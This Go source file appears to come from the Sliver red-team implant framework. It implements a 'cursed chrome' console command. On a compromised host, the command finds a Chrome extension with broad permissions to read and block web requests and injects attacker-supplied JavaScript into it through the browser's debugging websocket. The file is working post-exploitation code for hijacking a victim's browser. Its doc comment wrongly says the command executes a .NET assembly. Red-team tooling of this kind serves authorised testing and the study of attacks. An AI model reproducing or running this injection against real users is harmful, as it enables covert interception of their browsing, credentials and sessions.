package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"io/ioutil"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/desertbit/grumble"
)

var (
	ErrUserDataDirNotFound      = errors.New("could not find Chrome user data dir")
	ErrChromeExecutableNotFound = errors.New("could not find Chrome executable")
	ErrUnsupportedOS            = errors.New("unsupported OS")

	windowsDriveLetters = "CDEFGHIJKLMNOPQRSTUVWXYZ"

	cursedChromePermissions    = []string{overlord.AllURLs, overlord.WebRequest, overlord.WebRequestBlocking}
	cursedChromePermissionsAlt = []string{overlord.AllHTTP, overlord.AllHTTPS, overlord.WebRequest, overlord.WebRequestBlocking}
)

// CursedChromeCmd - Execute a .NET assembly in-memory
func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	payloadPath := ctx.Flags.String("payload")
	if payloadPath == "" {
		con.PrintErrorf("Please specify a payload path with --payload\n")
		return
	}
	payload, err := ioutil.ReadFile(payloadPath)
	if err != nil {
		con.PrintErrorf("Could not read payload file: %s\n", err)
		return
	}

	curse := avadaKedavra(session, ctx, con)
	if curse == nil {
		return
	}

	con.PrintInfof("Searching for Chrome extension with all permissions ... ")
	chromeExt, err := overlord.FindExtensionWithPermissions(curse, cursedChromePermissions)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	// There is one alternative set of permissions that we can use if we don't find an extension
	// with all the proper permissions.
	if chromeExt == nil {
		chromeExt, err = overlord.FindExtensionWithPermissions(curse, cursedChromePermissionsAlt)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	if chromeExt != nil {
		con.Printf("success!\n")
		con.PrintInfof("Found viable Chrome extension %s%s%s (%s)\n", console.Bold, chromeExt.Title, console.Normal, chromeExt.ID)
		con.PrintInfof("Injecting payload ... ")

		ctx, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
		_, err = overlord.ExecuteJS(ctx, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		con.Printf("success!\n")
	} else {
		con.Printf("failure!\n")
		con.PrintInfof("No viable Chrome extensions were found ☹️\n")
	}
}
